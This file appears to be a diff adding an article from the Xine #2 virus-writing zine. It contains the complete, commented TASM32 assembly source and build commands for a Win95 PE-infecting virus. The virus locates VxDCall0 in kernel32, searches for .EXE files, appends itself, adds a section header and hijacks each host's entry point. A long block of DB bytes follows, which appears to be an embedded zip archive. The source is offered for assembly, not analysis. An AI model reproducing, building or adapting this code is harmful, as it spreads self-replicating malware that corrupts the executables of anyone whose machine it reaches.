@@ -1,0 +1,854 @@
+
+
+                                        /-----------------------------\
+                                        | Xine - issue #2 - Phile 025 |
+                                        \-----------------------------/
+
+
+; This virus was designed for Xine2 the second zine release for iKx
+; sadly Xine2 may never be released.  Another group dies with the first
+; zine it releases <sigh>
+; Thanks to Murkry for some of the ideas
+; like using the unused data area in the data segment
+; and other invaluable ideas ;)
+;cheers,
+; jhb
+;
+; Compiling:
+;
+;tasm32 /ml /m3 Xine2,,;
+;tlink32 /Tpe /aa /c  Xine2,Xine2,, import32.lib
+;
+; Two assumations are made that will keep this virus within the win95
+; realm
+;       1 Check for 400000h as the bas loading address
+;       2 Check that some system dll is loaded at BFF70000H
+;          we hope its kernel32             
+;
+;       The virus will attempt to return to the host if either is
+;       not true
+;
+;
+;ok the object is to design this virus in chunks
+;
+; 1.
+;        Find a Quick way to locate the VxdCall 0 in the smallest possible
+;        way.
+;          Check if the list is in order then just goto or scan for
+;          the exports that have the firts 5 or so pointers into the
+;          same region ??? start at bff70000 area then scan upward
+;          Well this does not work, too many repeating bytes in the
+;           area but still using the Bff70000h start point its easy to
+;          find the Address table of the Exports which as it is in ordinal
+;          order we know the first one is (you guess it) VxDCall0 ;)
+;
+;       2 Next since we can be pretty sure this is win95
+;          we scan from 400000h for the PE marker
+;          then locate the data size and where it should be
+;          since win95 use the 4096 as a page size the data
+;          segment will be in increments of 4096 (1000h)
+;          then check how big an area the host program actual uses
+;          if it has at least 600h  bytes unused we then
+;          return with pointer to this area for virii to use as
+;          as a data R/W area.
+;         Well this works as long as there is only one data area
+;         if there is more then one then the calculations mess up
+;         so to remedy this one must search the Section headers for
+;         A R/W data area that has a dead space of 600
+;         this is a little harder to do but should better assure us of
+;         a location that has free space
+;         Basic structure of the GetDataSpace
+;         1 find the section entries
+;         2 check flags for r/w
+;           test  [header + 24h],0C0000000h      ;flags = 0ffset 24h
+;           jz    NotRW
+;       ;good one check it
+;       ;if if it as a big enough area for us
+;           mov   eax,[header + 8h] 
+;           sub   eax,[header + 14h]
+;           cmp   eax,600h
+;           jge   SpaceOk
+;           jmp   NotRW
+;           add   eax,[header + 0ch]
+;           add   eax,400000h
+;
+
+;typedef struct _WIN32_FIND_DATA {
+;   DWORD dwFileAttributes;                          0
+;   FILETIME ftCreationTime;            DD ?,?       4
+;   FILETIME ftLastAccessTime;          DD ?,?       C
+;   FILETIME ftLastWriteTime;           DD ?,?       14
+;   DWORD nFileSizeHigh;                             1C
+;   DWORD nFileSizeLow;                              20
+;   DWORD dwReserved0;                               24
+;   DWORD dwReserved1;                               28
+;   CHAR cFileName[MAX_PATH];                        2C
+;   CHAR cAlternateFileName[ 0EH ];                  12bh
+;} WIN32_FIND_DATA                                   139h
+
+
+.386
+locals
+jumps
+.model flat ,stdcall
+;Define the needed external functions and constants here.
+
+extrn           ExitProcess:PROC
+extrn           MessageBoxA:PROC                ;note in the user32.dll
+ 
+;----------------------------------------
+K32             equ     0BFF70000H         ;LOCATION OF THE KERNEL32
+                                           ;MODULE FOR WIN95
+Viruslen        equ     (EndViri - offset HOST  ) 
+
+;BELOW IS THE DATA AREA EQU FOR THE VIRUS
+;ESI SHOULD POINT TO A  START OF A MIN OF 400K R/W DATA AREA (I HOPE :> )
+; (Murk- If your wrong I am wasting my time!!! )
+
+OrginIP         equ      00h
+VxDCall         equ      04h
+Counter         equ      08h
+SrchHdle        equ      0Ch
+FleHdle         equ      010h
+Vsize           equ      014h            ;holds the VirtualSize of the virus
+PElocation      equ      018h
+LocOfOldIP      equ      01Ch           ;where we will place the old ip
+OldIP           equ      020h           ;Area to hold it b4 we write it 
+NewIP           equ      024h                             
+SRCH            EQU     0C0H            ;length 139h I think ;)
+
+BUFFER          equ     200H            ;buffer  for read write area
+
+;---------------------------------------------------------------------
+ 
+
+.data                                        ;the data area
+storage         dd      4 dup(0)            
+
+.code                                   ;executable code starts here
+
+HOST:
+
+;first we check if this is a version of win95 that the virus's knows
+; not a surefire test but if
+; 1: EAX is = EIP on startup on start if this is true
+;       then eax  upper word will in most cases be 0040 unless the first
+;       segemets take up more then (4095D * 255D) (1000*ff) which is
+;       unlikely at least now if it is we simply let the host take over.
+;
+; 2: Next we check within 200H bytes if there is a 'PE',00h
+;       once we find this we can find the data area and go from there
+;       again if we cant let the host take over
+;
+; 3: Lastly is there 2k free in the data segment to use if not            
+;       let the host take over we might want to check the host
+;       before we infect it to avoid this chance.
+
+HOST:
+        pushad
+        push   eax              ;the IP of the virus
+;here we are modifigng the store EAX in the stack so we can
+;use it as a jump to return the host later
+;warning this will crash horrible in a non Win95 setup
+
+        mov     edx,offset oldip - offset HOST
+        add     edx,eax                      ;
+        mov     eax,[edx]
+        add     eax,0400000h
+        mov     [esp + 20h],eax         ;fix the eax be 4 so we can return
+                                        ; to the host
+
+                       
+        CALL   GetDataSpace
+
+        OR     ESI,ESI          ;check if we found enough memory 
+        JZ     NotWinPopx       ;for us to play with
+
+        pop     dword ptr [esi + OrginIP]        ;store the start point
+                                                ;here
+
+        CAll   GET_VXD
+         
+        OR     ESI,ESI          ;check if we found enough memory 
+        JnZ    Win95            ;for us to play with
+
+        ;ok we now have the address to the VxDcall
+        ;so we can use the protected mode int21
+        ;also we know this is a version of win95 that I
+        ; 1 Loads the modules in at 400000h
+        ; 2 Some dll is loaded at bff7000h we hope its Kernel32
+        ;We otherwise would have failed in our tests or would have already
+        ;caused some sorta Exception error
+
+NotWinPopx:
+         pop     eax
+NotWin95:
+
+         jmp     fini
+
+
+;-----------------------------------------------------------------
+Win95:
+ 
+        mov     dword ptr ds:[ebp + Counter],0    ;INIT A COUNTER
+         
+
+        call    FindFile
+        mov     [ebp + SrchHdle],ebx
+
+        jnc     FoundOne        ;need find next routine
+                                ;ebx has the search file handle for next
+                                ;routine
+         
+
+TryAgain:                                
+        cmp     dword ptr [ebp + Counter],4     ;have we search for max
+        je      NoFile                          ;yep get out        
+
+        call    FindNext        ;try to find another
+        OR      EAX,EAX         ;
+        JZ      NoFile          ;there is no other
+
+         
+
+
+FoundOne:
+
+        inc     dword ptr [ebp + Counter]       ;inc the counter
+
+        CALL    OpenFile                        ;try to open the file
+        JC      NOT_OPEN                        ;not opened
+        jMP     FileOpen                        ;open
+
+NOT_OPEN:
+        cmp     dword ptr [ebp + Counter],4     ;have we search for max
+        je      NoFile                          ;yep get out        
+
+        mov     ebx,[ebp + SrchHdle]            ;get the search handle
+        jmp     TryAgain                        ;try again
+
+
+
+
+FileOpen:
+        MOV     [ebp + FleHdle],EBX             ;get the file handle 
+
+        MOV     ECX,400H                        ;readin the 
+        CALL    ReadFile                        ;header 
+ 
+        ;if we found a file we can read the file into the BUFFER location
+        ;say 1k worth check if infect setup the new entry and  
+        ;if all it ok then we can write the virus to the end
+        ;and then write the modified version to disk
+
+        ;Find the PEheader start
+        ;if not PE the get out
+        MOV     EAX,BUFFER + 3CH        ;OFFSET TO THE HEADER
+        ADD     EAX,EBP
+
+        mov     ESI,dword ptr [EAX]     ;
+
+        ADD     ESI,BUFFER
+        CMP     DWORD PTR [ESI+EBP],00004550H   ;Check for PE00
+        je      OkFile                          ;yay its one
+
+FileOpenError:
+        call    Close
+        jmp     TryAgain
+
+
+OkFile:
+        ;ESI + EBP = THE LOCATION OF THE PE HEADER
+        ;SO
+        ADD     ESI,EBP                 ;esi = PE header location
+
+        push    esi                     ;make sure its not infected
+
+        mov     eax,"niX."              ;yet
+        mov     ecx,200h                ;
+        repne   scasd                   ;
+
+        pop     esi
+
+        je      FileOpenError           ; its infected
+
+;ok we know the file is a PE and its not infected with Xine2
+;
+        mov     bl,02                   ;get end of to file
+        call    MovePoint               ;
+
+        mov     eax,dword ptr [esi + 28h]       ;save the old ip
+        mov     dword ptr [ebp + OldIP],eax     ;
+
+        mov     eax, Viruslen - 1
+        mov     ecx, [esi + 3ch]        ;file align is 3ch
+        add     eax,ecx                 ;
+        xor     edx,edx
+        div     ecx
+        mul     ecx
+
+        push    eax                     ;this is how much we are
+                                        ;writing with the buffer
+                                        ;
+
+ 
+        pop     ecx
+        mov     dword ptr[ebp + Vsize],ecx
+
+        mov     ecx, Viruslen
+; ebx - handle
+; ecx - number of bytes
+; edx - the location of what we want to write      
+ 
+
+        mov     edx,dword ptr [ebp + OrginIP]   ;get the file handle
+        call    WriteFile                       ;write this to the end           
+
+                     
+        mov     ecx,8                           ;we want to write the
+        mov     edx,ebp                         ;old ip at the end of the 
+        add     edx,OldIP                       ;virus
+        call    WriteFile                       ;
+
+        mov     edx,400400h              
+        mov     ecx,dword ptr[ebp + Vsize]
+        sub     ecx,Viruslen + 8
+        call    WriteFile
+
+         
+
+;ok if all is ok we need to add our section header
+;and then update the rva starting point
+
+
+        inc     word ptr [esi + 6]              ;section count 06
+                                                ;incrment it for us
+        xor     eax,eax
+        mov     ax,[esi + 6]
+
+        mov     [ebp + PElocation], esi   ; save the pointer to the PE header
+
+        dec     eax
+        mov     ecx,28h                 ;section header size
+        mul     ecx
+
+        add     esi,eax                 ;location in header where we
+        add     esi,0f8h                ;need to load the new section
+                                        ;header
+                                        ;f8 is the size of the pe header
+
+        mov     edi,esi                 ;edi = location in buffer
+                                        ;toplace new header
+
+        sub     esi,28h                 ;pointer to
+                                        ; the last old section header
+ 
+;-------------------
+;name of the section   header
+;-------------------
+
+        mov     eax,"niX."              ;this stores the new header
+        stosd                           ;name for us
+        mov     eax,"2e"                ;
+        stosd                           ;       8 bytes
+
+;-------------------
+;virtual size    what did we write to the file with buffer
+;-------------------
+
+        mov     eax,dword ptr[ebp + Vsize]      ;sets the virtual
+        stosd                                   ;size of the header
+                                                ;0ch
+;-------------------
+;Virtual address
+;-------------------         
+
+        mov     eax,[esi + 10h]          ;get size of raw data from previous
+        dec     eax                      ; - 1
+
+        mov     ebx,[ebp + PElocation]  ;get  the pointer to the PE header
+
+        mov     ecx,[ebx + 38h]         ;get the section alignmnet
+        add     eax,ecx
+        xor     edx,edx
+        div     ecx
+        mul     ecx                     ;eax = the size of the last section
+                                        ;Section aligmnet blocks
+
+        add     eax,[esi + 0ch]         ;add in the Vaddress of the last
+                                        ; section
+        
+        stosd                           ; 010h
+
+        mov     dword ptr [ebx + 28h],eax ;update the PEheader entry point
+
+        add     eax,dword ptr [ebx + 38h] ;update the size of the image file
+        mov     dword ptr [ebx + 50h],eax ;virii should not be bigger than
+                                          ;4096 or this will not work
+
+;-------------------
+;size of raw data
+;-------------------
+        mov     eax,[ebp + Vsize]       ;the size of the raw data
+        stosd                           ; 14h
+
+        add     dword ptr [ebx + 1ch],eax       ;update
+                                                ;size of code in pe header
+;-------------------
+;pointer to raw data
+;-------------------
+        mov     eax,[ebp + SRCH + 20h]  ; old size of file
+                                        ;from the find data struc
+
+        stosd                           ; 18 h bytes
+
+;-------------------
+;ptr to relocs  size 4
+;-------------------
+        push    LARGE 0
+        pop     eax
+        stosd
+;-------------------
+;ptr to line nums size 4
+;-------------------
+        stosd
+;-------------------
+;num relocs     size 2
+;-------------------
+        stosw
+
+;-------------------
+;num line no     size 2
+;-------------------
+        stosw
+;-------------------
+;Chararteristcs size 4
+; 6000 0020 excutable and readable code
+;-------------------
+        mov     eax,60000020h
+        stosd
+
+
+        
+
+;
+;ok write the firts 400h bytes back to the start of the file
+        
+        xor     bl,bl
+        call    MovePoint
+
+        mov     ecx,0400h
+        mov     edx, ebp
+        add     edx,BUFFER
+        call    WriteFile
+
+FileInfected:
+EFileOpen:
+        ;file error
+        ;need to close file and leave
+        call    Close
+
+
+NoFile:
+fini:         
+
+        popad
+        jmp     eax
+
+
+;====================================================================
+
+
+
+
+
+;--------------------------------------------------------------
+;all below are the int 21 calls the code uses or code that would
+;be used in a virus using this  method
+;-------------------------------------------------------------
+;int 21 714eh
+;cl = attributes mask
+;ch = required mask
+;si = time date format 0000h = 64 bit 0001h = msdos date time
+;ds:dx = the file name we are looking for
+;es:di = the place we want to fill with the found file
+;done
+;ax = file handle
+;cx = uncode flag
+;cf  set on error
+;ax= error code
+
+;FILE    equ     00400300h
+FNAME   EQU     02CH
+SecHeader       db      'Xine',0,0,0,0          ;8 byte header name
+HeaderFlags     dd      60000000h               ;Readable and Executable
+
+Fexe    db      '*.EXE',0
+
+FindFile:
+        mov     eax,0000714eh
+
+        mov     edx,offset Fexe - offset HOST   ;this will get us the *.exe
+        add     edx,[ebp + OrginIP]     ;
+
+        xor     esi,esi
+        inc     esi
+        push    ds
+        pop     es
+        mov     Edi, ebp           ;AREA TO SAVE THE FINDFILE INFO
+        add     edi, SRCH          ;
+        xor     ecx,ecx
+        Call    INT_21
+        mov     ebx,eax
+        ret
+
+;-------------------------------------------------------------
+;ax = 714Fh
+;ebx = file handle from previous search
+;si = date time requested
+;es:di  buffer for findata
+;note ebx = the search handle
+
+FindNext:
+        mov     ebx,[ebp + SrchHdle]
+        mov     eax,0000714fh
+        mov     esi,1
+         
+        mov     Edi, ebp
+        add     edi, SRCH     
+
+        call    INT_21
+        ret
+;-------------------------------------------------------------
+;
+; ebx = the file handle we want to close
+Close:
+        mov     eax,00003E00h
+        MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle 
+        call    INT_21
+        ret
+
+
+;-------------------------------------------------------------
+; ecx:edx = the offset into the file
+; al    0 = start of file
+;       1 = current file
+;       2 = end of file        
+MovePoint:
+
+        
+        xor     ecx,ecx
+        mov     edx,ecx
+
+MoveP:
+        mov     eax,00004200h
+        mov     al,bl
+        MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle
+        call    INT_21
+        ret
+
+;-------------------------------------------------------------
+;usual dos function here just need the filename from the search routine
+;check cf for error
+OpenFile:
+        mov     eax,00003d02h
+        mov     EdX, ebp
+        ADD     Edx,SRCH + FNAME
+        xor     ecx,ecx
+        call    INT_21
+        mov     EBX,eax
+        ret
+
+;-------------------------------------------------------------
+;CreateFile:
+;        call    c1
+;c1:
+;        pop     eax
+;         
+;        xor     ecx,ecx
+;
+;        mov     edx,offset Fake - offset c1
+;        add     eax,edx
+;        xchg    eax,edx
+  ;mov    ds
+;        mov     eax,00003c00h
+;        call    INT_21
+;        mov     ebx,eax
+;        ret
+;Fake    db      'Murk$$',0
+;
+;
+;-------------------------------------------------------------
+; ebx - handle
+; ecx - number of bytes
+; edx - the location of what we want to write      
+WriteFile:
+        mov     eax,00004000h
+        MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle
+        ;mov     cx,number of bytes
+        ;mov     dx,the location of the data
+        call    INT_21
+        ret
+
+;-------------------------------------------------------------
+;ecx number of bytes
+;edx = where we write the info to 
+ReadFile:
+ 
+        MOV     EBX, [EBP+ FleHdle] 
+        mov     eax, 00003f00h      
+        ;mov     ecx,2
+        mov     Edx,EBP
+        ADD     EDX,BUFFER
+        
+        call    INT_21
+        ret
+
+;-------------------------------------------------------------
+INT_21:
+        push    ecx
+        push    eax
+        push    002a0010h
+            
+        call    dword ptr [ebp + VxDCall]
+        RET 
+
+;vxd0            dd      0bff713d4h    ;this is the addresss for the
+                                       ;vxdcall0
+;get_21          dd      002a0010h     ;this is the 2a = Vwin32 10 = the int21
+                                       ;routine
+
+;------------------------------------------------------------------------------------
+; onreturn will have
+; ESI = the start of a 4k area of r\w data that the virus can use
+; eax = the data location to use
+
+GetDataSpace:
+         
+        mov     eax,00004550H       ;check for PE00
+        mov     edi, 00400000h
+        repne   scasd               ;
+        jne     NotWin95A
+
+        xchg    edi,esi
+
+        lodsw                           ; ok we are at header + 4
+                                        ; now we are at 6
+        lodsw                           ; ax = the number of sections
+                                        ;peheader + 8
+
+        xor     ecx,ecx                 ;get the number of sections
+        mov     ecx,eax                 ;
+
+        add     esi,0f8h - 8            ;get to the section header         
+                                        ;
+
+        ;esi points to the first section header
+
+TryNext:
+        cmp     ecx,0
+        jz      NotWin95A
+
+        mov     eax,[esi + 24h]         ;flags
+        and     eax,0c0000000h
+        cmp     eax,0c0000000h
+        jne      NextOne 
+
+        mov     eax,[esi + 8h]          ;virtual size
+        xor     edx,edx
+
+        mov     ebx,4095
+        add     eax,ebx
+        inc     ebx
+        div     ebx
+        mul     ebx
+
+        sub     eax,[esi + 10h]         ;size of raw data
+        cmp     eax,600h
+        jge     OkSpace
+
+
+NextOne:
+        add     esi,28h
+        loop    TryNext
+
+OkSpace:
+        mov     eax,[esi + 0ch]         ;virtual address
+        add     eax,[esi + 10h]         ;size of raw data     
+        add     eax,00400000h
+        push    eax
+        pop     esi
+        ret
+
+NotWin95A:
+        xor     esi,esi
+        ret
+ 
+         
+ ;end of GetDataSpace
+;-----------------------------------------------------------
+;-----------------------------------------------------------
+;returns with the VxDcall fill with the correct location
+;or again esi = 0 if failed
+;
+GET_VXD:
+        
+        PUSH    ESI             ;SAVE OUR DATA AREA
+        pop     ebp
+
+        XOR     EAX,EAX
+        MOV     ESI,K32 + 3CH
+        LODSW
+
+      ;ESI = THE PE HEADER START of the Kernel32
+
+        ADD     EAX,K32
+        CMP     DWORD PTR [EAX],00004550H       ;check for PE00
+        JE      NoERROR
+
+ERROR:  JMP    NotWin95A  
+
+;ESI SHOULD HOLD THE POINTER TO THE
+;RVA TO THE EXPORT DIRECTORY 
+
+NoERROR:
+        MOV     ESI,[EAX + 78H]         ; 78H = THE EXPORT RVA
+        ADD     ESI,K32 + 1CH           ; 1CH RVA TO THE ADDRESS TABLE
+
+    
+        LODSD                           ; EAX IS
+        ADD     EAX,K32                 ; FIRST OF THE ORDINAL
+                                        ; EXPORTS
+
+        PUSH    EAX                     ;get this in the esi
+        POP     ESI                     ;
+
+        LODSD                           ;gets the rva to the call
+        ADD     EAX,K32                 ;EAX = THE VXDCALL IMPORT
+
+        mov     [ebp +VxDCall],eax      ;save it in our data area
+
+        RET   
+;end GetVxd 
+;-----------------------------------------------------------
+        DB   80,75,3,4,20,0,0,0,8,0,242,170,119,32,167,184,152,155,109,25,0
+        DB   0,63,90,0,0,7,0,0,0,65,68,68,46,65,83,77,205,60,107,115,219,56
+        DB   146,223,93,229,255,208,179,181,85,147,76,148,172,36,59,153,140
+        DB   85,185,41,197,166,199,218,113,44,173,164,36,190,155,115,165,32
+        DB   18,146,24,83,132,150,15,75,158,171,251,239,135,110,0,36,64,82,178
+        DB   125,201,94,157,146,74,36,18,104,52,26,221,141,126,1,61,152,110
+        DB   4,176,52,205,87,44,11,69,156,2,75,56,172,88,192,33,91,178,12,54
+        DB   97,20,193,45,231,107,249,51,76,225,46,76,242,84,62,148,63,98,249
+        DB   132,203,175,241,47,175,15,15,122,144,112,22,173,240,139,250,116
+        DB   224,116,201,253,91,152,139,4,142,219,248,89,202,81,168,203,76,254
+        DB   31,9,22,132,241,2,88,16,36,60,77,203,126,93,221,143,6,79,197,138
+        DB   67,122,159,102,124,5,129,196,35,84,29,121,0,242,229,251,243,243
+        DB   159,17,238,69,217,89,126,54,28,150,98,205,33,204,82,137,118,18
+        DB   243,232,168,11,246,71,182,46,59,76,37,58,102,74,18,62,203,228,72
+        DB   235,12,50,33,167,147,229,73,140,223,16,229,165,72,51,8,231,192
+        DB   229,196,121,34,241,40,65,196,66,182,79,114,174,224,202,191,226
+        DB   150,186,136,217,87,238,103,136,178,132,17,240,52,92,196,54,9,195
+        DB   24,252,101,30,223,166,26,159,206,43,107,26,231,97,44,167,8,255
+        DB   200,67,255,22,54,236,30,65,68,194,103,25,39,208,159,182,193,41
+        DB   147,232,182,65,47,66,186,146,63,185,68,113,45,210,52,156,69,220
+        DB   130,37,187,219,160,65,211,87,78,6,123,70,97,74,56,74,64,34,9,228
+        DB   212,228,195,24,190,230,242,233,66,200,81,69,2,169,207,98,92,70
+        DB   7,8,246,229,219,181,72,178,84,45,213,146,221,41,228,230,33,62,123
+        DB   77,61,133,68,40,140,51,158,224,0,138,148,14,148,148,173,56,36,124
+        DB   17,138,24,126,253,245,87,72,51,150,100,184,182,179,249,156,214
+        DB   22,153,145,41,156,8,141,124,189,97,73,224,192,248,204,163,72,17
+        DB   54,16,60,165,229,216,136,228,182,5,153,16,176,98,241,189,28,96
+        DB   205,89,134,220,54,187,207,120,170,137,230,0,81,227,204,242,76,162
+        DB   128,140,144,167,216,28,167,243,94,99,178,212,200,209,132,136,187
+        DB   56,75,113,97,28,56,115,92,56,236,214,87,124,13,25,155,69,28,132
+        DB   34,182,167,9,182,89,134,62,73,67,104,209,62,140,89,228,192,82,235
+        DB   177,225,112,27,139,141,33,109,154,129,136,57,246,122,118,47,114
+        DB   88,228,56,72,152,61,135,79,219,51,228,137,54,244,158,59,28,222
+        DB   133,43,190,149,211,10,99,159,35,48,164,226,140,195,58,225,89,118
+        DB   15,105,158,112,69,188,48,45,69,217,22,38,181,250,137,88,21,82,140
+        DB   18,141,216,140,60,88,177,228,150,215,24,35,182,121,53,96,25,147
+        DB   163,255,201,129,197,129,156,57,79,80,54,33,93,138,60,10,36,38,46
+        DB   63,40,44,17,15,200,83,5,224,184,253,203,27,164,21,131,53,91,112
+        DB   5,202,0,118,59,243,197,138,199,90,99,201,41,134,177,252,235,39
+        DB   28,31,166,184,4,4,233,89,7,39,241,188,142,179,79,98,177,20,27,152
+        DB   133,11,137,108,193,122,74,248,215,137,88,36,108,5,204,207,114,134
+        DB   12,194,45,29,32,63,225,28,167,181,68,68,51,136,56,147,93,222,32
+        DB   181,52,207,229,177,236,17,32,65,113,48,167,167,214,52,168,83,141
+        DB   184,40,181,19,166,10,7,36,248,93,152,132,33,62,70,178,48,119,104
+        DB   34,14,209,121,252,183,207,212,197,17,248,82,64,80,46,82,32,237
+        DB   139,170,151,180,113,66,204,36,226,232,158,24,139,192,32,8,27,130
+        DB   210,21,170,229,74,36,106,14,212,156,190,32,141,124,22,249,121,164
+        DB   119,144,21,50,101,190,182,65,164,66,41,213,21,15,238,21,50,216
+        DB   125,133,122,38,229,44,241,151,4,101,194,125,132,0,75,206,2,84,26
+        DB   21,173,211,167,9,22,40,26,197,67,211,151,61,32,93,51,159,132,237
+        DB   77,187,109,247,51,12,206,32,10,179,44,226,178,143,210,117,2,2,161
+        DB   164,222,176,99,134,212,199,221,80,206,50,71,174,177,225,48,197
+        DB   216,136,97,49,244,60,225,92,13,108,183,124,207,210,208,135,52,75
+        DB   114,63,67,80,90,1,252,198,179,51,137,253,164,218,188,83,42,142
+        DB   84,147,128,199,89,18,186,60,214,213,60,58,143,216,130,104,3,201
+        DB   223,54,174,26,203,112,19,128,63,20,253,224,5,116,143,151,55,173
+        DB   246,105,187,173,101,151,62,61,5,224,29,180,231,243,148,103,216
+        DB   200,133,242,245,79,252,247,74,100,227,207,229,139,222,66,136,128
+        DB   86,77,97,17,102,214,59,228,126,18,0,90,12,20,32,30,139,124,177
+        DB   44,25,56,119,121,22,86,226,78,254,203,217,182,85,98,251,118,121
+        DB   3,110,171,52,159,213,90,117,228,156,220,86,254,106,173,91,161,200
+        DB   85,230,178,224,242,95,162,248,240,182,242,138,186,85,166,73,235
+        DB   28,4,181,81,219,126,117,212,178,149,214,140,164,119,229,63,217
+        DB   253,154,7,124,174,151,31,190,124,30,92,29,117,191,156,15,174,206
+        DB   190,156,245,167,125,248,47,5,231,236,243,112,124,6,193,230,60,140
+        DB   120,63,203,146,112,150,103,60,181,71,168,124,52,79,159,15,46,189
+        DB   233,224,131,7,243,236,52,225,196,142,211,112,197,157,142,103,103
+        DB   240,107,235,87,253,227,184,214,239,146,165,89,223,247,121,154,86
+        DB   122,58,253,78,27,251,125,78,194,140,87,7,116,250,117,142,237,9
+        DB   198,56,191,73,248,39,191,8,23,203,61,179,195,142,167,141,29,47
+        DB   197,102,127,63,232,182,93,146,142,121,202,147,59,30,180,31,232
+        DB   7,93,7,213,178,99,231,193,142,111,85,199,211,139,254,24,124,196
+        DB   244,138,173,248,31,31,250,215,95,70,253,233,197,205,206,254,221
+        DB   83,187,99,63,202,120,18,179,140,23,16,160,237,93,64,83,247,78,119
+        DB   134,28,246,223,80,101,167,135,63,157,163,95,150,200,153,135,7,175
+        DB   142,222,190,57,60,64,45,22,165,135,7,95,243,213,90,254,247,106
+        DB   37,2,30,161,90,201,160,149,102,129,124,137,150,200,25,159,135,74
+        DB   197,67,204,57,26,221,124,75,216,202,166,121,236,107,103,33,14,192
+        DB   151,95,50,134,155,44,110,18,175,112,28,217,50,137,45,12,188,109
+        DB   152,141,18,129,28,119,50,26,15,79,235,45,62,200,87,108,193,223
+        DB   139,109,159,90,84,231,208,139,69,198,141,189,155,167,60,57,234
+        DB   190,10,16,79,212,24,47,31,249,57,60,248,189,226,13,240,127,230
+        DB   74,182,10,111,162,28,241,114,120,218,159,14,134,87,48,60,135,233
+        DB   133,7,191,123,227,43,239,242,168,43,199,124,252,167,247,97,120
+        DB   246,241,210,131,243,225,24,87,14,13,172,79,232,0,68,60,174,226
+        DB   240,204,139,3,249,46,132,151,32,148,102,190,24,78,166,0,207,129
+        DB   212,202,123,239,114,248,25,6,19,194,133,86,190,63,246,250,224,253
+        DB   227,35,1,199,167,159,6,227,143,19,217,212,155,12,96,114,49,252
+        DB   120,121,6,163,225,224,106,10,211,33,244,1,38,211,254,120,138,179
+        DB   233,195,135,1,77,235,184,221,254,157,54,213,18,222,179,129,28,118
+        DB   228,193,201,191,1,89,73,207,62,228,201,237,75,24,204,225,94,228
+        DB   9,108,18,180,29,6,192,86,176,97,41,89,213,171,123,200,194,21,255
+        DB   225,135,31,176,199,225,193,48,89,132,241,96,84,163,49,144,142,212
+        DB   134,106,195,91,220,134,78,69,78,6,80,253,237,91,249,118,146,248
+        DB   203,139,32,226,245,183,167,242,237,121,196,237,151,214,219,14,13
+        DB   76,166,99,125,233,229,235,227,165,245,28,122,75,17,5,202,85,253
+        DB   20,38,104,238,161,22,50,123,56,185,111,135,7,35,175,176,5,170,208
+        DB   16,211,75,225,15,231,195,40,48,100,176,94,159,218,131,245,148,69
+        DB   188,225,202,108,93,71,104,193,144,251,24,5,16,174,15,15,44,24,21
+        DB   64,221,182,3,168,79,22,145,128,37,245,204,96,118,76,80,81,91,227
+        DB   207,195,131,43,190,217,5,201,157,127,237,115,120,48,25,159,94,216
+        DB   79,144,233,20,221,45,129,65,44,34,30,47,178,37,105,28,24,160,225
+        DB   21,223,146,71,114,120,240,254,227,249,185,55,174,15,223,181,101
+        DB   14,65,204,242,249,28,57,128,12,28,52,235,212,28,148,81,250,4,97
+        DB   127,64,19,144,80,189,34,99,242,145,159,94,225,207,40,92,210,76
+        DB   36,108,81,178,20,217,3,184,223,66,144,175,159,181,159,187,36,148
+        DB   131,249,34,176,25,112,231,56,124,203,253,92,121,142,212,133,60
+        DB   79,165,93,17,14,106,133,19,34,133,114,8,55,133,73,54,183,76,221
+        DB   59,158,164,200,157,98,174,29,42,50,89,11,14,254,49,37,191,146,172
+        DB   50,244,153,25,249,130,18,32,87,70,36,90,197,33,89,191,157,19,240
+        DB   250,215,8,244,29,120,131,17,72,152,132,80,190,46,190,218,35,235
+        DB   88,136,237,90,113,182,5,200,215,107,116,103,69,18,40,86,15,99,88
+        DB   161,99,229,179,148,167,232,175,181,219,199,109,200,227,136,220
+        DB   102,227,237,150,144,82,190,224,43,142,225,6,118,203,37,52,203,19
+        DB   121,118,220,254,229,245,25,252,4,221,215,175,207,158,43,23,239
+        DB   167,249,252,185,118,180,237,104,141,132,31,222,242,232,190,244
+        DB   210,208,185,86,182,43,122,72,232,96,174,214,242,125,196,179,210
+        DB   249,163,33,197,29,79,94,105,223,186,123,162,220,234,130,244,58
+        DB   34,70,204,172,163,12,150,211,196,224,199,145,247,99,203,49,78,133
+        DB   118,200,181,229,175,6,39,103,219,184,2,165,163,131,187,236,66,40
+        DB   55,60,83,108,96,192,176,5,67,71,119,174,123,103,59,16,2
